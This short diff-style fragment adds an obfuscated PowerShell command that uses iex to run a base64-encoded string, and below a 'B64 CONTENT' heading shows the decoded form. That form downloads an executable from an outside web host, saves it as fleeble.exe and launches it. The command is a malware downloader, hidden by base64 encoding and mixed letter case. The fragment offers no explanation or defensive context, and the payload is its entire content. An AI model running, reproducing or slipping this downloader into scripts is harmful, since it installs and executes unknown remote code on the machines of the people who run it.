@@ -1,0 +1,7 @@
+iex([sySTem.text.EnCODInG]::utf8.getString([SYsteM.ConVerT]::froMBaSe64STrinG('CihOZXctT2JqZWN0IFN5U3RlbS5OZXQud0VCQ2xJRW50KS5kT3duTG9hRGZpbEUoJ2h0dHA6Ly9pY2JnLWlxLmNvbS9TY3JpcHRzL2tpbmV0aWNzL2NhdGVnb3JpZXMvM3JtYXguZXhlJywnZmxlZWJsZS5leGUnKTtTdGFydC1Qcm9jZXNzICdmbGVlYmxlLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SyStem.Net.wEBClIEnt).dOwnLoaDfilE('http://icbg-iq.com/Scripts/kinetics/categories/3rmax.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
